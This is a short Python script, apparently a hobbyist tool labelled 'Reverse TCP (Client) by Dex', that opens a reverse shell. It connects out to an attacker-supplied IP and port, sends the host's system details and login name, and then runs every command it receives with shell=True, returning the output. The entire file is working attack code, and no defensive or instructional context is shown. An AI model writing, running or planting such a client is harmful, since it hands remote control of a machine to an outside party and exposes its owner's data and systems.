import socket,subprocess,getopt,sys,os

def usage():

	print("\nReverse TCP (Client) by Dex")
	print()
	print("Usage: connect.py -i <ip> -p <port>")
	print("Example: connect.py -i 192.168.0.4 -p 8000")
	print("Example: connect.py -i 62.37.142.7 -p 1337")
	sys.exit(0)


def main():
	host = ''
	port = 0

	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hi:p:",["help","ip=","port="])
	except getopt.GetoptError as err:
		print(str(err))
		usage()

	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-i","--ip"):
			ip = str(sys.argv[2])
		elif o in ("-p","--port"):
			try:
				port = int(sys.argv[4])
			except:
				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
		else:
			assert False,"Unhandled Option"
	connect(ip,port)

def connect(ip,port):

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip,port))

		x_info = ""
		for x in os.uname():
			x_info += x + ","
		x_info += os.getlogin()
		x_info = x_info.encode('utf-8')
		s.send(x_info)
		shell(s)

def shell(s):

	while 1:
		command = s.recv(1024)
		command = command.decode('utf-8')

		if command != "exit":
			sh = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			out, err = sh.communicate()

			result = out + err
			s.send(result)
		else:
			break
	s.close()

if __name__ == "__main__":
	main()
